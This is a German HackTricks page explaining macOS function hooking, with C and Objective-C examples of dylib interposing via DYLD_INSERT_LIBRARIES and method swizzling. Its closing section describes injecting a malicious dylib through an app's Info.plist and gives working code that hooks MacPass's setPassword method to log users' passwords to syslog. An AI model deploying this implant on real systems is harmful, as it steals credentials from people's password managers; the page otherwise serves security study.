# macOS Funktion Hooking

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

- Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
- Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
- **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Funktionsinterponierung

Erstellen Sie eine **dylib** mit einem **`__interpose` (`__DATA___interpose`)** Abschnitt (oder einem Abschnitt, der mit **`S_INTERPOSING`** gekennzeichnet ist), der Tupel von **Funktionspointern** enthält, die auf die **ursprünglichen** und die **Ersatz**-Funktionen verweisen.

Dann **injizieren** Sie die dylib mit **`DYLD_INSERT_LIBRARIES`** (die Interponierung muss vor dem Laden der Haupt-App erfolgen). Offensichtlich gelten hier auch die [**Einschränkungen**, die für die Verwendung von **`DYLD_INSERT_LIBRARIES`** gelten](macos-library-injection/#check-restrictions).

### Interponieren von printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
Die **`DYLD_PRINT_INTERPOSTING`** Umgebungsvariable kann zum Debuggen von Interposing verwendet werden und gibt den Interpose-Prozess aus.
{% endhint%}

Beachten Sie auch, dass **Interposing zwischen dem Prozess und den geladenen Bibliotheken** stattfindet und nicht mit dem gemeinsamen Bibliotheks-Cache funktioniert.

### Dynamisches Interposing

Jetzt ist es auch möglich, eine Funktion dynamisch mit der Funktion **`dyld_dynamic_interpose`** zu interposen. Dies ermöglicht es, eine Funktion zur Laufzeit programmgesteuert zu interposieren, anstatt dies nur zu Beginn zu tun.

Es ist nur erforderlich, die **Tupel** der **zu ersetzenden Funktion und der Ersatzfunktion** anzugeben.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

In ObjectiveC wird ein Methodenaufruf wie folgt durchgeführt: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Es wird das **Objekt**, die **Methode** und die **Parameter** benötigt. Wenn eine Methode aufgerufen wird, wird eine **Nachricht gesendet**, indem die Funktion **`objc_msgSend`** verwendet wird: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Das Objekt ist **`someObject`**, die Methode ist **`@selector(method1p1:p2:)`** und die Argumente sind **value1**, **value2**.

Durch die Objektstrukturen ist es möglich, ein **Array von Methoden** zu erreichen, in dem die **Namen** und **Zeiger** auf den Methodencode **gespeichert** sind.

{% hint style="danger" %}
Beachten Sie, dass da Methoden und Klassen anhand ihrer Namen zugegriffen werden, diese Informationen im Binärformat gespeichert sind. Daher ist es möglich, sie mit `otool -ov </path/bin>` oder [`class-dump </path/bin>`](https://github.com/nygard/class-dump) abzurufen.
{% endhint %}

### Zugriff auf die Rohmethoden

Es ist möglich, auf die Informationen der Methoden zuzugreifen, wie z.B. Name, Anzahl der Parameter oder Adresse, wie im folgenden Beispiel:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling mit method\_exchangeImplementations

Die Funktion **`method_exchangeImplementations`** ermöglicht es, die **Adresse** der **Implementierung einer Funktion für eine andere** zu **ändern**.

{% hint style="danger" %}
Daher wird beim Aufruf einer Funktion die **andere Funktion ausgeführt**.
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
In diesem Fall, wenn der **Implementierungscode der legitimen** Methode den **Methodennamen überprüft**, könnte er dieses Swizzling erkennen und verhindern, dass es ausgeführt wird.

Die folgende Technik hat diese Einschränkung nicht.
{% endhint %}

### Method Swizzling mit method\_setImplementation

Das vorherige Format ist seltsam, weil du die Implementierung von 2 Methoden gegeneinander austauschst. Mit der Funktion **`method_setImplementation`** kannst du die **Implementierung einer Methode durch eine andere** ändern.

Denke daran, die Adresse der Implementierung der Originalmethode zu speichern, wenn du sie aus der neuen Implementierung aufrufen möchtest, bevor du sie überschreibst, da es später viel komplizierter sein wird, diese Adresse zu finden.

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## Hooking-Angriffsmethodik

Auf dieser Seite wurden verschiedene Möglichkeiten zum Hooken von Funktionen diskutiert. Allerdings beinhalteten sie **das Ausführen von Code innerhalb des Prozesses, um anzugreifen**.

Um dies zu erreichen, ist die einfachste Technik die Injektion eines [Dyld über Umgebungsvariablen oder Hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Allerdings könnte dies auch über [Dylib-Prozessinjektion](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) erfolgen.

Beide Optionen sind jedoch **auf ungeschützte** Binärdateien/Prozesse **beschränkt**. Überprüfen Sie jede Technik, um mehr über die Einschränkungen zu erfahren.

Ein Funktion-Hooking-Angriff ist sehr spezifisch, ein Angreifer würde dies tun, um **sensible Informationen aus einem Prozess zu stehlen** (ansonsten würde man einfach einen Prozessinjektionsangriff durchführen). Und diese sensiblen Informationen könnten sich in von Benutzern heruntergeladenen Apps wie MacPass befinden.

Der Angriffsvektor des Angreifers wäre es also, entweder eine Schwachstelle zu finden oder die Signatur der Anwendung zu entfernen, die **`DYLD_INSERT_LIBRARIES`** Umgebungsvariable durch die Info.plist der Anwendung einzufügen und etwas Ähnliches hinzuzufügen:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
und dann die Anwendung **neu registrieren**:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Fügen Sie in diese Bibliothek den Hooking-Code ein, um die Informationen zu exfiltrieren: Passwörter, Nachrichten...

{% hint style="danger" %}
Beachten Sie, dass in neueren Versionen von macOS, wenn Sie die Signatur der Anwendungsdatei entfernen und sie zuvor ausgeführt wurde, macOS die Anwendung nicht mehr ausführen wird.
{% endhint %}

#### Bibliotheksbeispiel

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## Referenzen

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
